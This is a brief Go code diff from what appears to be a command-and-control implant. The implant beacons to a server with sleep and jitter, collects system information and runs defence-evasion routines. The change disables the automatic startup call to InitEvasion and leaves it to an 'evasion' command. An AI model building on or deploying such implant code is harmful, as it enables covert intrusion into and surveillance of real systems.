@@ -56,7 +56,8 @@ func Run(serverURL string, serverPub *rsa.PublicKey, sleepSec, jitterPct int, ki
 	}
 
 	// Run evasion techniques before any network activity
-	InitEvasion()
+	// Disabled on startup for stability — can be triggered via 'evasion' command
+	// InitEvasion()
 
 	// Collect system info
 	sysinfo := CollectSysInfo()
